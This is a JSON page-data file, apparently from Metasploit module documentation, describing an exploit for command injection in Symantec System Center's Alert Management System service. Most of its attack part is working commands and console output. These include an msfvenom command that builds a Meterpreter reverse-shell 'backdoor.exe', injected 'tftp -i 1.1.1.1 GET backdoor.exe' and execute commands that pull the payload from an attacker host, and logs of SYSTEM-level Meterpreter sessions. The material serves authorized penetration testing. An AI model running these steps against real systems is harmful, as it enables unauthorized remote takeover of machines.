{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/antivirus/ams_hndlrsvc","result":{"data":{"moduleMetadataJson":{"id":"70488857-d4e0-5178-8cec-eace2b296448","name":"Symantec System Center Alert Management System (hndlrsvc.exe) Arbitrary Command Execution","fullname":"exploit/windows/antivirus/ams_hndlrsvc","description":"Symantec System Center Alert Management System is prone to a\n        remote command-injection vulnerability because the application fails\n        to properly sanitize user-supplied input.  This is part of Symantec\n        AntiVirus Corporate Edition 8.0 - 10.1.7.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/antivirus/ams_hndlrsvc","documentationSlug":"/modules/documentation/exploit/windows/antivirus/ams_hndlrsvc","referencesSlug":"/modules/references/exploit/windows/antivirus/ams_hndlrsvc"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module exploits Symantec System Center's alert management system (hndlrsvc.exe) with an arbitrary command execution.  The payload is uploaded via TFTP\nand then executed on the system.\nThis is part of Symantec AntiVirus Corporate Edition 8.0-10.1.7</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/antivirus/ams_hndlrsvc</code></li>\n<li>Do: <code class=\"language-text\">set rhost</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>CMD</strong></p>\n<p>  Optional command line to run instead of attempting to directly inject a payload</p>\n<p>  <strong>RPORT</strong></p>\n<p>  The port the service is running on.  Default is 38292.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"manual-upload-and-execute\" style=\"position:relative;\"><a href=\"#manual-upload-and-execute\" aria-label=\"manual upload and execute permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Manual Upload and Execute</h3>\n<p>If the module doesn't work for a shell, it's possible to run the CMD twice to emulate the steps the module takes.</p>\n<ol>\n<li>start atftpd: <code class=\"language-text\">atftpd --daemon --port=69 /tftpboot/</code></li>\n<li>create payload: <code class=\"language-text\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 lport=4444 -f exe -o /tftpboot/backdoor.exe</code></li>\n<li>start metasploit</li>\n<li>start a multihandler</li>\n<li>load the module: <code class=\"language-text\">use exploit/windows/antivirus/ams_hndlrsvc</code></li>\n<li>use ams: <code class=\"language-text\">set CMD &#39;tftp -i 1.1.1.1 GET backdoor.exe&#39;</code></li>\n<li>run</li>\n<li>use ams: <code class=\"language-text\">set cmd &#39;backdoor.exe&#39;</code></li>\n<li>run</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">root@kali:~/metasploit-framework# ./msfconsole \n\nmsf &gt; ifconfig\n[*] exec: ifconfig\n\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n      inet 1.1.1.1  netmask 255.255.255.0  broadcast 192.168.3.255\n      inet6 fe80::20c:29ff:fef9:62a1  prefixlen 64  scopeid 0x20&lt;link&gt;\n      ether 00:0c:29:f9:1f:a1  txqueuelen 1000  (Ethernet)\n      RX packets 70933  bytes 39287343 (37.4 MiB)\n      RX errors 0  dropped 0  overruns 0  frame 0\n      TX packets 11688  bytes 3788654 (3.6 MiB)\n      TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nmsf &gt; use exploit/multi/handler \npayload =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(handler) &gt; set lhost 1.1.1.1\nlhost =&gt; 1.1.1.1\nmsf exploit(handler) &gt; set lport 4444\nlport =&gt; 4444\nmsf exploit(handler) &gt; exploit -j\n[*] Exploit running as background job.\n\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n[*] Starting the payload handler...\nmsf exploit(handler) &gt; use exploit/windows/antivirus/ams_hndlrsvc \nmsf exploit(ams_hndlrsvc) &gt; set rhost 2.2.2.2\nrhost =&gt; 2.2.2.2\nmsf exploit(ams_hndlrsvc) &gt; set lport 9999\nlport =&gt; 9999\nmsf exploit(ams_hndlrsvc) &gt; set cmd &#39;tftp -i 1.1.1.1 GET backdoor.exe&#39;\nCMD =&gt; tftp -i 1.1.1.1 GET backdoor.exe\nmsf exploit(ams_hndlrsvc) &gt; run\n\n[*] Started reverse TCP handler on 1.1.1.1:9999 \n[*] 2.2.2.2:38292 - Executing command &#39;tftp -i 1.1.1.1 GET backdoor.exe&#39;\n[*] Exploit completed, but no session was created.\nmsf exploit(ams_hndlrsvc) &gt; set cmd &#39;backdoor.exe&#39;\ncmd =&gt; backdoor.exe\nmsf exploit(ams_hndlrsvc) &gt; run\n\n[*] Started reverse TCP handler on 1.1.1.1:9999 \n[*] 2.2.2.2:38292 - Executing command &#39;backdoor.exe&#39;\n[*] Sending stage (957999 bytes) to 2.2.2.2\n[*] Meterpreter session 1 opened (1.1.1.1:4444 -&gt; 2.2.2.2:1038) at 2016-09-30 11:59:13 -0400\n[*] Exploit completed, but no session was created.\nmsf exploit(ams_hndlrsvc) &gt; sessions -l\n\nActive sessions\n===============\n\nId  Type                   Information                 Connection\n--  ----                   -----------                 ----------\n1   meterpreter x86/win32  NT AUTHORITY\\SYSTEM @ WEBB  1.1.1.1:4444 -&gt; 2.2.2.2:1038 (2.2.2.2)\n\nmsf exploit(ams_hndlrsvc) &gt; sessions -v\n\nActive sessions\n===============\n\nSession ID: 1\n      Type: meterpreter x86/win32\n      Info: NT AUTHORITY\\SYSTEM @ WEBB\n    Tunnel: 1.1.1.1:4444 -&gt; 2.2.2.2:1038 (2.2.2.2)\n       Via: exploit/multi/handler\n      UUID: 0a85ec1678bc8465/x86=1/windows=1/2016-09-30T15:59:12Z\n MachineID: 8b2889ec93a961f2cc3f2db4620def57\n   CheckIn: 28s ago @ 2016-09-30 12:00:15 -0400\nRegistered: No\n\n\n\nmsf exploit(ams_hndlrsvc) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"using-standard-options\" style=\"position:relative;\"><a href=\"#using-standard-options\" aria-label=\"using standard options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using Standard Options</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/antivirus/ams_hndlrsvc \nmsf exploit(ams_hndlrsvc) &gt; set rhost 2.2.2.2\nrhost =&gt; 2.2.2.2\nmsf exploit(ams_hndlrsvc) &gt; set lport 4445\nlport =&gt; 4445\nmsf exploit(ams_hndlrsvc) &gt; show options\n\nModule options (exploit/windows/antivirus/ams_hndlrsvc):\n\n Name   Current Setting  Required  Description\n ----   ---------------  --------  -----------\n CMD                     no        Execute this command instead of using command stager\n LHOST  1.1.1.1     no        The listen IP address from where the victim downloads the payload\n RHOST  2.2.2.2   yes       The target address\n RPORT  38292            yes       The target port\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n Name      Current Setting  Required  Description\n ----      ---------------  --------  -----------\n EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n LHOST     1.1.1.1     yes       The listen address\n LPORT     4445             yes       The listen port\n\n\nExploit target:\n\n Id  Name\n --  ----\n 0   Windows Universal\n\n\nmsf exploit(ams_hndlrsvc) &gt; exploit\n\n[*] Started reverse TCP handler on 1.1.1.1:4445 \n[*] 2.2.2.2:38292 - Sending request to 2.2.2.2:38292\n[+] 2.2.2.2:38292 - tftp -i 1.1.1.1 GET OQTAVJBVWZH.exe\n[*] 2.2.2.2:38292 - Attempting to execute the payload...\n[+] 2.2.2.2:38292 - OQTAVJBVWZH.exe\n[*] Sending stage (957999 bytes) to 2.2.2.2\n[*] Meterpreter session 1 opened (1.1.1.1:4445 -&gt; 2.2.2.2:1041) at 2016-09-30 12:13:18 -0400\n\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"70488857-d4e0-5178-8cec-eace2b296448"}}}